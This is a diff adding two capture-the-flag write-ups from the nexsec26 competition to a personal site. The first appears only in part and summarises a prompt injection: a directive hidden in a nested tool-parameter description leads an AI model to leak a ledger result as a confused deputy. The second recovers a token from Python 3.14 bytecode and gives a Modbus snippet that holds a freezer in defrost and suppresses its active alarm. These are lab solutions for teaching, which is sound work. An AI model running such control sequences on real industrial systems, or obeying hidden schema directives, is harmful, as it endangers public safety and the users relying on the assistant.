+              <h4>Result</h4><p>A directive hidden in an unsanitised nested parameter description causes the assistant to act as a confused deputy and disclose the ledger result.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{c0c48a6e877e4b4de67f1a78f1bbef858a56fa724a4695fa69402d89e91}</code></pre>
+
+              <p><strong>Tools used:</strong> curl, HTTP cookies, extension manifests. <strong>What I learned:</strong> Sanitising only visible top-level fields is insufficient when nested schema documentation is later treated as trusted model context. Tool authorisation must be enforced by the application, not delegated to natural-language instructions.</p>
+            </div>
+          </details>
+          <details class="challenge-card">
+            <summary><span><span class="mono-label">Misc</span><strong>Pls don&#x27;t be cold</strong></span><span aria-hidden="true">+</span></summary>
+            <div class="challenge-body">
+              <span class="team-credit">Solved by: Ha1qal</span>
+              <h4>Challenge</h4><p>The handout contains Python 3.14 bytecode and maintenance-tunnel services: a Modbus/TCP fieldbus and FrostLink web console. The goal is to recover the daily service token and trigger a real food-safety incident.</p>
+              <h4>First look / analysis</h4><p>Older decompilers produced incorrect Python 3.14 output, so the write-up disassembles with a native 3.14 interpreter. The recovered code reveals a date-based token used both for web service authentication and Modbus write unlocks.</p>
+              <ol>
+              <li class="solve-step"><h4>Disassemble with the matching interpreter</h4>
+                <p>I installed Python 3.14 through `uv` and used `dis.dis()` on the marshalled bytecode. This recovers the service-token algorithm accurately, avoiding the incorrect decompiler output.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/pls-dont-be-cold-1.webp" alt="Pls don&#x27;t be cold challenge page" loading="lazy"><figcaption>The challenge page provides the bytecode handout and two maintenance-tunnel services.</figcaption></figure>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/pls-dont-be-cold-2.webp" alt="Python 3.14 disassembly" loading="lazy"><figcaption>The sanitised native disassembly establishes the correct bytecode-analysis approach.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Authenticate and map the fieldbus</h4>
+                <p>For 2026-10-17, the recovered algorithm yields service token `07610f86`, split as HR0 `0x0761` and HR1 `0x0f86`. The panel register map identifies coil 0 as MT1 defrost hold and coil 8 as the MT1 alarm-enable control.</p>
+
+
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/pls-dont-be-cold-3.webp" alt="FrostLink register map" loading="lazy"><figcaption>The panel register map shows the coils and holding registers used in the incident sequence.</figcaption></figure>
+
+              </li>
+              <li class="solve-step"><h4>Trigger the active-alarm incident</h4>
+                <p>I held MT1 defrost until its temperature passed the 8.0 °C alarm threshold, then suppressed coil 8 only after `alarm_active` became true. Keeping defrost active let MT1 exceed the 12.0 °C incident threshold while the alarm was suppressed, which latched the incident.</p>
+
+                <p class="code-language">python</p>
+                <pre><code>c.write_coil(0, True, device_id=1)   # defrost hold MT1
+c.write_coil(8, True, device_id=1)   # alarm enabled
+if mt1[&quot;alarm_active&quot;]:
+    unlock()
+    c.write_coil(8, False, device_id=1)  # suppress while hot</code></pre>
+                <figure><img class="writeup-figure" src="../assets/writeups/nexsec/pls-dont-be-cold-4.webp" alt="Incident record and flag" loading="lazy"><figcaption>The successful incident record shows the final flag.</figcaption></figure>
+                <a class="file-download" href="../assets/writeups/nexsec/files/pls-dont-be-cold-solver-source.txt" download>Download full solver source transcription<span></span></a>
+              </li>
+              </ol>
+              <h4>Result</h4><p>Suppressing an active high-temperature alarm while MT1 remains above its safe threshold triggers the recorded critical food-safety incident.</p>
+            <p class="flag-label">Flag</p>
+            <pre><code>nexsec26{dont-be-so-cold-to-me,-i&#x27;ll-get-flu_1601c791820a653d6f53cb8fef09d7d1b40fad91e63688a0df7f4d15692e6827}</code></pre>
+
+              <p><strong>Tools used:</strong> Python 3.14, dis, uv, Modbus/TCP, HTTP. <strong>What I learned:</strong> Bytecode should be analysed with a matching interpreter when decompiler opcode tables lag behind. The sequence of control actions matters: suppressing an inactive alarm is not equivalent to suppressing an active alarm during an over-temperature condition.</p>
+            </div>
+          </details>
+        </div>
+      </section>
     </div></main>
     <footer><div class="container"><p>© <span id="year"></span> Muhammad Ezekiel Mukhriz.</p><p>built by hand, deployed to GitHub Pages</p></div></footer>
     <script src="../script.js"></script>
